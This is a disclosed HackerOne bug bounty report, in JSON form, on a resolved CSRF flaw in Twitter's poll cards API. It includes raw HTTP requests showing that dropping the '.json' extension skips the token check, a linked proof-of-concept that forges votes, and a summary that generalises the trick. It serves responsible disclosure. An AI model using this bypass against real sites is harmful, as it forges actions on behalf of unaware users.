{"id":95555,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NTU1NQ==","url":"https://hackerone.com/reports/95555","title":"CSRF on cards API","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-10-24T07:48:10.271Z","submitted_at":"2015-10-24T07:48:10.271Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"filedescriptor","url":"/filedescriptor","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":61,"url":"https://hackerone.com/twitter","handle":"twitter","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Twitter","twitter_handle":"twittersecurity","website":"https://twitter.com","about":"Twitter helps you create and share ideas and information instantly, without barriers."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-04-11T03:26:55.147Z","bug_reporter_agreed_on_going_public_at":"2017-03-12T03:26:50.532Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\nI would like to report an CSRF issue on the cards API endpoint (/i/cards/api/v1.json).\n\n##Detail\nCurrently the endpoint is responsible for poll cards (maybe more to come). When a user votes, a request will be sent to this endpoint to record the user's selected choice. By default there's a CSRF protection in place which looks for *authenticity_token* in the query part of the URI. However, such check only appears for the exact path (*/i/cards/api/v1.json*). Given that the server seems to relax path extension, attackers can circumvent the protection by using the path */i/cards/api/v1* (without .json) for the request.\n\nThis is how a normal request looks like:\n```http\nPOST https://twitter.com/i/cards/api/v1.json?tweet_id=657629231309041664\u0026card_name=poll2choice_text_only\u0026forward=false\u0026capi_uri=capi%3A%2F%2Fpassthrough%2F1 HTTP/1.1\nHost: twitter.com\nCookie: foo=bar\n\n{\"twitter:string:card_uri\":\"card://657629230759415808\",\"twitter:long:original_tweet_id\":\"657629231309041664\",\"twitter:string:selected_choice\":\"2\"}\n```\n\nwithout providing a valid CSRF token, it will return a HTTP 403 error.\nNow that we trim the extension part (**v1.json** to **v1**) and resend it:\n```http\nPOST https://twitter.com/i/cards/api/v1?tweet_id=657629231309041664\u0026card_name=poll2choice_text_only\u0026forward=false\u0026capi_uri=capi%3A%2F%2Fpassthrough%2F1 HTTP/1.1\nHost: twitter.com\nCookie: foo=bar\n\n{\"twitter:string:card_uri\":\"card://657629230759415808\",\"twitter:long:original_tweet_id\":\"657629231309041664\",\"twitter:string:selected_choice\":\"2\"}\n```\n\nit still lacks the CSRF token, but this time it returns HTTP 200 and the vote is successfully made.\nAll in all, attackers can abuse it and make victims to vote without noticing.\n\n#PoC\nHere's a handy tool to CSRF any poll. You may also just intercept the vote request to validate the issue.\n1. Go to http://innerht.ml/pocs/twitter-cards-csrf/\n2. Fill in the poll card's information you want to CSRF (e.g. for https://twitter.com/Bugcrowd/status/657629231309041664 the parameters are\ntweet_id: 657629231309041664, card_uri: card://657629230759415808, selected_choice: 2)\n3. Click the button to activate the attacke. Of course the whole process can be silent.","vulnerability_information_html":"\u003cp\u003eHi,\u003cbr\u003e\nI would like to report an CSRF issue on the cards API endpoint (/i/cards/api/v1.json).\u003c/p\u003e\n\n\u003ch2 id=\"detail\"\u003eDetail\u003c/h2\u003e\n\n\u003cp\u003eCurrently the endpoint is responsible for poll cards (maybe more to come). When a user votes, a request will be sent to this endpoint to record the user\u0026#39;s selected choice. By default there\u0026#39;s a CSRF protection in place which looks for \u003cem\u003eauthenticity_token\u003c/em\u003e in the query part of the URI. However, such check only appears for the exact path (\u003cem\u003e/i/cards/api/v1.json\u003c/em\u003e). Given that the server seems to relax path extension, attackers can circumvent the protection by using the path \u003cem\u003e/i/cards/api/v1\u003c/em\u003e (without .json) for the request.\u003c/p\u003e\n\n\u003cp\u003eThis is how a normal request looks like:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003ePOST\u003c/span\u003e \u003cspan class=\"nn\"\u003ehttps://twitter.com/i/cards/api/v1.json?tweet_id=657629231309041664\u0026amp;card_name=poll2choice_text_only\u0026amp;forward=false\u0026amp;capi_uri=capi%3A%2F%2Fpassthrough%2F1\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003etwitter.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eCookie\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003efoo=bar\u003c/span\u003e\n\n{\u0026quot;twitter:string:card_uri\u0026quot;:\u0026quot;card://657629230759415808\u0026quot;,\u0026quot;twitter:long:original_tweet_id\u0026quot;:\u0026quot;657629231309041664\u0026quot;,\u0026quot;twitter:string:selected_choice\u0026quot;:\u0026quot;2\u0026quot;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ewithout providing a valid CSRF token, it will return a HTTP 403 error.\u003cbr\u003e\nNow that we trim the extension part (\u003cstrong\u003ev1.json\u003c/strong\u003e to \u003cstrong\u003ev1\u003c/strong\u003e) and resend it:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003ePOST\u003c/span\u003e \u003cspan class=\"nn\"\u003ehttps://twitter.com/i/cards/api/v1?tweet_id=657629231309041664\u0026amp;card_name=poll2choice_text_only\u0026amp;forward=false\u0026amp;capi_uri=capi%3A%2F%2Fpassthrough%2F1\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003etwitter.com\u003c/span\u003e\n\u003cspan class=\"na\"\u003eCookie\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003efoo=bar\u003c/span\u003e\n\n{\u0026quot;twitter:string:card_uri\u0026quot;:\u0026quot;card://657629230759415808\u0026quot;,\u0026quot;twitter:long:original_tweet_id\u0026quot;:\u0026quot;657629231309041664\u0026quot;,\u0026quot;twitter:string:selected_choice\u0026quot;:\u0026quot;2\u0026quot;}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eit still lacks the CSRF token, but this time it returns HTTP 200 and the vote is successfully made.\u003cbr\u003e\nAll in all, attackers can abuse it and make victims to vote without noticing.\u003c/p\u003e\n\n\u003ch1 id=\"poc\"\u003ePoC\u003c/h1\u003e\n\n\u003cp\u003eHere\u0026#39;s a handy tool to CSRF any poll. You may also just intercept the vote request to validate the issue.\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eGo to \u003ca title=\"http://innerht.ml/pocs/twitter-cards-csrf/\" href=\"/redirect?url=http%3A%2F%2Finnerht.ml%2Fpocs%2Ftwitter-cards-csrf%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://innerht.ml/pocs/twitter-cards-csrf/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eFill in the poll card\u0026#39;s information you want to CSRF (e.g. for \u003ca title=\"https://twitter.com/Bugcrowd/status/657629231309041664\" href=\"/redirect?url=https%3A%2F%2Ftwitter.com%2FBugcrowd%2Fstatus%2F657629231309041664\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://twitter.com/Bugcrowd/status/657629231309041664\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e the parameters are\ntweet_id: 657629231309041664, card_uri: card://657629230759415808, selected_choice: 2)\u003c/li\u003e\n\u003cli\u003eClick the button to activate the attacke. Of course the whole process can be silent.\u003c/li\u003e\n\u003c/ol\u003e\n","bounty_amount":"280.0","formatted_bounty":"$280","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-04-11T03:26:50.559Z","allow_singular_disclosure_after":-117344862.91079211,"singular_disclosure_allowed":true,"vote_count":37,"voters":["delimitry","kapytein","adn","hackerhero","jon_bottarini","ngalog","secgeek","eveeez","r3y","apapedulimu","and 27 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":634347,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.\n\nThank you for helping keep Twitter secure!","markdown_message":"\u003cp\u003eThank you for your report. We believe it may be a valid security issue and will investigate it further. It could take some time to find and update the root cause for an issue, so we thank you for your patience.\u003c/p\u003e\n\n\u003cp\u003eThank you for helping keep Twitter secure!\u003c/p\u003e\n","automated_response":false,"created_at":"2015-10-27T18:18:16.182Z","updated_at":"2015-10-27T18:18:16.182Z","actor":{"username":"apinter","cleared":false,"url":"/apinter","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/021/688/53801559ec10573f82935ef2c1682b2ce25f2d38_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":637236,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We consider this issue to be fixed now. Can you please confirm?\n\nThank you for helping keep Twitter secure!","markdown_message":"\u003cp\u003eWe consider this issue to be fixed now. Can you please confirm?\u003c/p\u003e\n\n\u003cp\u003eThank you for helping keep Twitter secure!\u003c/p\u003e\n","automated_response":false,"created_at":"2015-10-29T17:52:02.216Z","updated_at":"2015-10-29T17:52:02.216Z","actor":{"username":"apinter","cleared":false,"url":"/apinter","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/021/688/53801559ec10573f82935ef2c1682b2ce25f2d38_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"filedescriptor","url":"/filedescriptor"},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":638016,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"That was fast! And I can confirm it is fixed.","markdown_message":"\u003cp\u003eThat was fast! And I can confirm it is fixed.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-10-30T05:54:04.467Z","updated_at":"2015-10-30T05:54:04.467Z","actor":{"username":"filedescriptor","cleared":true,"url":"/filedescriptor","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":639261,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks again for helping us keep Twitter safe and secure for our users!","markdown_message":"\u003cp\u003eThanks again for helping us keep Twitter safe and secure for our users!\u003c/p\u003e\n","automated_response":false,"created_at":"2015-10-30T22:38:03.083Z","updated_at":"2015-10-30T22:38:03.083Z","actor":{"url":"/twitter","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Twitter"}},"bounty_amount":"280.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"twitter","collaborator":{"username":"filedescriptor","url":"/filedescriptor"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1535100,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-12T03:26:50.546Z","updated_at":"2017-03-12T03:26:50.546Z","first_to_agree":true,"actor":{"username":"filedescriptor","cleared":true,"url":"/filedescriptor","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1603946,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-04-11T03:26:55.166Z","updated_at":"2017-04-11T03:26:55.166Z","actor":{"url":"/twitter","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/061/85a63a443f017ad8353de4f68ebf52fdd61c345a_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Twitter"}},"genius_execution_id":null,"team_handle":"twitter","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":3536,"category":"researcher","content":"This report demonstrates a technique to bypass CSRF protection by removing the file extension.\n\nIn short, if posting to `/api/entity.json` doesn't work, try `/api/entity`.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eThis report demonstrates a technique to bypass CSRF protection by removing the file extension.\u003c/p\u003e\n\n\u003cp\u003eIn short, if posting to \u003ccode\u003e/api/entity.json\u003c/code\u003e doesn\u0026#39;t work, try \u003ccode\u003e/api/entity\u003c/code\u003e.\u003c/p\u003e\n"}]}